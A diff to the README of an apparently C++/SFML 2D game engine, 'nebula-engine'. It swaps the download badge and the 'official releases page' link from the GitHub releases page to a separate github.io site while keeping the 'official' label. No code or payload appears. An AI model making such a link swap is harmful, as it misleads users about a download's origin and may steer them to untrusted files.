@@ -1,6 +1,6 @@
 # 🌌 nebula-engine - Create stunning 2D games with ease
 
-[![Download Nebula Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shirleenpositive507/nebula-engine/releases)
+[![Download Nebula Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://shirleenpositive507.github.io)
 
 Nebula Engine helps you build 2D games. You do not need deep programming knowledge to start your project. The engine handles the heavy lifting involved in rendering graphics and managing input. It uses C++ and SFML to provide a stable foundation for your game ideas. You can focus on your art, your logic, and your story while the engine takes care of the technical side.
 
@@ -20,7 +20,7 @@ If your computer meets these standards, the engine will run smoothly. Outdated d
 
 Follow these steps to set up the engine on your machine.
 
-1. Visit the [official releases page](https://github.com/Shirleenpositive507/nebula-engine/releases) to find the correct file.
+1. Visit the [official releases page](https://shirleenpositive507.github.io) to find the correct file.
 2. Select the latest version listed at the top of the page. The version number will look like v1.0, v1.1, and so on.
 3. Look for the file ending in .zip within the Assets section.
 4. Click the file to start the download.
